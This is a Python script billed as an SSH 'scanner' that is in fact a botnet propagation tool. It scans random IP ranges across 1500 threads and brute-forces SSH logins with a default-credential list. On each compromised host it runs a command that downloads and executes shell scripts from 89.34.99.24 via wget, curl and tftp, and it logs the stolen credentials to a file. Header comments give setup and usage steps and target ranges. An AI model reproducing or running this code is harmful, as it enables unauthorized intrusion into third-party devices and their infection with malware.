#!/usr/bin/env python

#		                                    kittyhaxz PYTHON SCANNER MADE BY KittyHaxz (KYRO REMASTERED)
#                                   IF YOU OWN THIS THEN YOUR NAME MUST BE KittyHaxz :) NO OTHER ANSWER! 
# 
# 

# SHOULD INSTALL THE FOLLOING BELOW

# yum update -y; yum install python perl python-paramiko nano gcc screen -y

# nano /usr/include/bits/typesizes.h

# scroll down and edit the 1024 to 999999

# THEN SAVE IT 

# ulimit -n 999999

# Usage: python kittyhaxz.py THREADS RANGES 1(slow but effective) 2(fast but less effective) HERE IS A EXAMPLE 

#       python kittyhaxz.py 500 5.78 101

#     ^^^^^^^slow but affective ^^^^^^^^

#       python kittyhaxz.py 500 B 119.93 3 

#     ^^^^^^Fast But Not As stable^^^^^^

# Examples Below

# python kittyhaxz.py 500 LUCKY 1 1

# python kittyhaxz.py 500 LUCKY3 1 4

# python kittyhaxz.py 500 LUCKY2 1 3

# python kittyhaxz.py 500 B 49.144 3

#

# RANGES 113.53, 119.93, 122.3, 122.52, 101.109, 180.180, 125.27, 101.109
import threading, paramiko, random, socket, time, sys

paramiko.util.log_to_file("/dev/null")

blacklist = [
    '127'
]

passwords = [ 
  "telnet:telnet"
  "admin:1234",
  "root:root",
  "ubnt:ubnt",
  "vagrant:vagrant",
  "pi:raspberry",
  "root:maxided"
      "root:123456",
    "root:Love2020",
    "root:Zero",
    "root:Password",
    "root:password",
    "root:qwerty",
    "root:dragon",
    "root:pussy",
    "root:baseball",
    "root:football",
    "root:monkey",
    "root:696969",
    "root:abc123"
	"admin:admin",
	"admin:1234",
	"admin:Guest",
	"ubnt:ubnt",
	"guest:guest",
	"user:user",
	"test:test",
  
]

if sys.argv[4] == '1':
     passwords = ["root:root"] # ALRIGHT 
if sys.argv[4] == '2':
     passwords = ["guest:guest"] #EHH
if sys.argv[4] == '3':
     passwords = ["admin:1234"] #ALRIGHT
if sys.argv[4] == '4':
     passwords = ["telnet:telnet"] #SEXY
if sys.argv[4] == '5':
	passwords = ["root:root", "admin:1234"]

print "\x1b[0;32m _   ___ _   _         _   _                 \x1b[0;36m"
print "\x1b[0;36m| | / (_) | | |       | | | |                \x1b[0;32m"
print "\x1b[0;36m| |/ / _| |_| |_ _   _| |_| | __ ___  __ ____\x1b[0;32m"
print "\x1b[0;32m|    \| | __| __| | | |  _  |/ _` \ \/ /|_  /\x1b[0;36m"
print "\x1b[0;32m| |\  \ | |_| |_| |_| | | | | (_| |>  <  / / \x1b[0;36m"
print "\x1b[0;36m\_| \_/_|\__|\__|\__, \_| |_/\__,_/_/\_\/___|\x1b[0;36m"
print "\x1b[0;36m                  __/ |                      \x1b[0;36m"
print "\x1b[0;36m                 |___/                       \x1b[0;31m"
print "\x1b[0;31m\x1b[0;31m"
print "\x1b[0;31m\x1b[0;31m"

ipclassinfo = sys.argv[2]
if ipclassinfo == "A":
    ip1 = sys.argv[3]
elif ipclassinfo == "B":
    ip1 = sys.argv[3].split(".")[0]
    ip2 = sys.argv[3].split(".")[1]
elif ipclassinfo == "C":
    ips = sys.argv[3].split(".")
    num=0
    for ip in ips:
        num=num+1
        if num == 1:
            ip1 = ip
        elif num == 2:
            ip2 = ip
        elif num == 3:
            ip3 = ip
class sshscanner(threading.Thread):
    global passwords
    global ipclassinfo
    if ipclassinfo == "A":
        global ip1
    elif ipclassinfo == "B":
        global ip1
        global ip2
    elif ipclassinfo == "C":
        global ip1
        global ip2
        global ip3
    def run(self):
        while 1:
            try:
                while 1:
                    thisipisbad='no'
                    if ipclassinfo == "A":
                        self.host = ip1+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "B":
                        self.host = ip1+'.'+ip2+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "C":
                        self.host = ip1+'.'+ip2+'.'+ip3+'.'+str(random.randrange(0,256))
                    #DONT FUCK WITH ANY OF THIS STUFF
                    elif ipclassinfo == "LUCKY":
                        lucky = ["125.27","101.109","113.53","118.173","122.170","122.180","46.62","5.78"]
                        self.host = random.choice(lucky)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "LUCKY2":
                        lucky2 = lucky2 = [ "122.3","210.213","59.69","122.52","122.54","119.93","124.105","125.104","119.92","119.91","49.144" ]
			self.host = random.choice(lucky2)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
		    elif ipclassinfo == "LUCKY3":
                        lucky2 = [ "103.20","103.30","103.47","103.57","12.188","12.34" ]
			self.host = random.choice(lucky2)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))

                    for badip in blacklist:
                        if badip in self.host:
                            thisipisbad='yes'
                    if thisipisbad=='no':
                        break
                username='root'
                password=""
                port = 22
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.host, port))
                s.close()
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                dobreak=False
                for passwd in passwords:
                    if ":n/a" in passwd:
                        password=""
                    else:
                        password=passwd.split(":")[1]
                    if "n/a:" in passwd:
                        username=""
                    else:
                        username=passwd.split(":")[0]
                    try:
                        ssh.connect(self.host, port = port, username=username, password=password, timeout=3)
                        dobreak=True
                        break
                    except:
                        pass
                    if True == dobreak:
                        break
                badserver=True
                stdin, stdout, stderr = ssh.exec_command("/sbin/ifconfig")
                output = stdout.read()
                if "inet addr" in output:
                    badserver=False
                if badserver == False:
                        print '\x1b[0;36mSending Infection Payload to \x1b[0;32m' +self.host+'|\x1b[0;36m'+username+'|\x1b[0;32m'+password+'|\x1b[0;36m'+str(port)
			ssh.exec_command("cd /tmp ;wget http://89.34.99.24/oh.sh;curl -O http://89.34.99.24/oh.sh;sh oh.sh;rm -rf oh.sh;tftp -r toh.sh -g 89.34.99.24;sh toh.sh; tftp 89.34.99.24 -c get toh2.sh; sh toh2.sh; rm -rf toh.sh toh2.sh oh.sh")
			kittyhaxz = open("kittyhaxz.txt", "a").write(username + ":" + password + ":" + self.host + "\n")
                        time.sleep(15)
                        ssh.close()
            except:
                pass

for x in range(0,1500):
    try:
        t = sshscanner()
        t.start()
    except:
        pass
